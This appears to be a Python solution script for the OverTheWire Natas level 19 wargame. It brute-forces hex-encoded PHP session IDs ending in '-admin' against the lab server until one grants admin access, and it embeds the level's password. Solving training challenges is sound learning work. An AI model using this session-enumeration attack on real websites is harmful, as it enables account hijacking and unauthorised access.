import requests

BASIC_AUTH_USER = 'natas19'
BASIC_AUTH_PASSWORD = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'

def try_to_login_as_admin():
    suffix = '-admin'
    for number in range(0, 1000):
        session_id_string = str(number) + suffix
        id_session = ''.join(x.encode('hex') for x in session_id_string)
        cookies = {'PHPSESSID': id_session}
        response = requests.post('http://natas19.natas.labs.overthewire.org/index.php?debug', auth=(BASIC_AUTH_USER, BASIC_AUTH_PASSWORD), cookies=cookies)
        response_text = response.text
        print('Progress: ', number)
        if 'You are an admin' in response_text:
            print('Found credentials')
            print('Session ID', id_session)
            print(response_text)
            break

try_to_login_as_admin()